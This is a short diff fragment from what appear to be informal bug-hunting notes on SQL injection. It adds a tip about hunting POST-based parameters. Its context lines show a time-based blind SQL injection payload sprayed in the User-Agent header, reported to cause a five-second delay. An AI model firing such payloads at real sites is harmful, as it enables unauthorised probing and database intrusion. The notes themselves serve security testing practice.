@@ -25,3 +25,8 @@ sprayed in user-agent - worked✅
 
 User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
 ===> 5.xx seconds delay
+
+
+# sql injection tip
+
+u can hunt post based param when if the URL has POST /hello/string/testing.php HTTP/1.1
